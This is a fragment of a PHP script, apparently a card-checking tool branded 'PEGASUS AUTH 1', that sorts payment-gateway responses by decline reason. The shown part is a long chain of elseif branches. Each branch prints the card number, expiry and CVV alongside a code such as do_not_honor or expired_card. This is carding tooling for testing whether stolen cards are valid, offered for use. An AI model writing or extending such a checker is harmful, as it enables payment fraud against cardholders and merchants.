  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "incorrect_number")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  'card was declined.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Reprovada ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "generic_decline")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "do_not_honor")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result3,  "expired_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "processing_error")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3, "service_not_allowed")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  '"cvc_check": "unchecked"')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  '"cvc_check": "unavailable"')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "parameter_invalid_empty")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Reprovada : Missing Card Details ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "lock_timeout")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "transaction_not_allowed")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3, "three_d_secure_redirect")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  'Card is Reprovada by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3, "missing_payment_information")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  'Your card has expired.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  'card number is incorrect.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  'card was declined.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Reprovada ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "generic_decline")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "do_not_honor")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result3,  "expired_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card  ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "processing_error")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3, "service_not_allowed")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result3,  "parameter_invalid_empty")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Reprovada : Missing Card Details ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "lock_timeout")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "transaction_not_allowed")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result3,  'Card is Reprovada by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3, "missing_payment_information")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif 
(strpos($result3,  '-1')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='black'><font class='badge badge-light'> Update Nonce ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </i></font> <br> <font class='badge badge-primary'>$bank [$country] - $type</i></font> <br>";
}

else {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card was Reprovada due to an Unknown Error ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;
//echo $result2;
//echo $result3;

?>